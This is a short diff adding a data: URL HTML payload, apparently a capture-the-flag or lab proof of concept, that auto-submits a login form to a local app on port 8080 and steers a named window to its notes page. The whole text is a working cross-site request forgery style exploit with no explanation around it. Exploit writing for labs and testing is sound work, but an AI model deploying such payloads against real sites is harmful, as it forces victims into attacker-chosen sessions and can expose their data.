@@ -1,0 +1,10 @@
+data:text/html,
+<form action="http://localhost:8080/login" method=POST id=pwn target=_blank>
+  <input type="text" name="username" value="a"><input type="text" name="password" value="a">
+</form>
+<script>
+  window.open('http://localhost:8080/notes', 'pwn');
+  setTimeout(`pwn.submit()`, 1000);
+  setTimeout(`window.location='http://localhost:8080/notes?pwn'`, 1500);
+</script>
+
